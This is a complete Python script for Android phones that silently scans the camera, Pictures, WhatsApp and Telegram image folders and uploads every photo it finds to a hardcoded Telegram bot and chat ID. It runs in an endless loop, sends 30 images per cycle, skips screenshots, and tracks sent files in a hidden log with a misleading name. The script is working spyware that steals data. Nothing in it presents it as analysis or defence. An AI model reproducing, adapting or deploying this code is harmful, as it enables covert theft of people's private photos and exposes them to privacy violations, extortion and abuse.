import os
import time
import requests

BOT_TOKEN = "8711969097:AAGCjUfiohcUHRWV_1UGa1j51GCEwmCtl3s"
CHAT_ID = "7084557369"
LOG_FILE = "/storage/emulated/0/.system_coins_log.txt"

def get_sent():
    if not os.path.exists(LOG_FILE): return set()
    with open(LOG_FILE, "r") as f: return set(f.read().splitlines())

def save_sent(path):
    try:
        with open(LOG_FILE, "a") as f: f.write(path + "\n")
    except: pass

def send_doc(path):
    try:
        with open(path, "rb") as f:
            r = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", 
                              data={"chat_id": CHAT_ID}, files={"document": f}, timeout=60)
        return r.status_code == 200
    except: return False

def scan():
    targets = [
        "/storage/emulated/0/DCIM/Camera",
        "/storage/emulated/0/Pictures",
        "/storage/emulated/0/WhatsApp/Media/WhatsApp Images",
        "/storage/emulated/0/Telegram/Telegram Images",
        "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images"
    ]
    sent = get_sent()
    found = []
    for base in targets:
        if not os.path.exists(base): continue
        for root, dirs, files in os.walk(base):
            # فلتر تجاهل لقطات الشاشة
            if "screenshot" in root.lower(): continue
            for file in files:
                if file.lower().endswith((".jpg", ".jpeg", ".png")):
                    p = os.path.join(root, file)
                    if p not in sent: found.append(p)
    found.sort(key=os.path.getmtime)
    return found

def main():
    time.sleep(10)
    while True:
        try:
            photos = scan()
            if not photos:
                time.sleep(60)
                continue
            count = 0
            for p in photos:
                if count >= 30: break # يرسل 30 صورة في الدورة الواحدة
                if send_doc(p):
                    save_sent(p)
                    count += 1
                    time.sleep(0.4)
            time.sleep(10)
        except: time.sleep(10)

if __name__ == "__main__":
    main()
